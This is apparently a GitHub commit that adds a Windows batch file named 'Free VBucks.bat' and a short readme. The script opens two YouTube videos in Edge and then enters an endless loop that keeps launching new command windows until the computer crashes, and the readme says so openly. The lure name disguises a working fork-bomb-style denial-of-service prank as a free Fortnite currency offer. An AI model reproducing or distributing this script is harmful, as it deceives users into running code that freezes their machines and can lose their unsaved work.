abdc80a77498dadec0ddfb62f4bdf6ad093f5580
3coasters <73067189+3coasters@users.noreply.github.com>
2021-03-21 00:57:06 +0100

    Add files via upload

---
+++ Free VBucks.bat
@@ -0,0 +1,12 @@
+@echo off 
+mode 1000
+color 02
+echo Enjoy Nyan cat!!!
+timeout 1
+start "im edge" "https://www.youtube.com/watch?v=SkgTxQm9DWM""
+timeout 7"
+start "im edge" https://www.youtube.com/watch?v=QT13kk8HDDo?autoplay=1
+timeout 15
+:crash
+start 
+goto crash
---
+++ readme.md
@@ -0,0 +1,3 @@
+When you open Free VBucks.exe nyan cat will open in edge, then el risitas will laugh on you and then your PC will Crash.
+
+Created in .bat file.
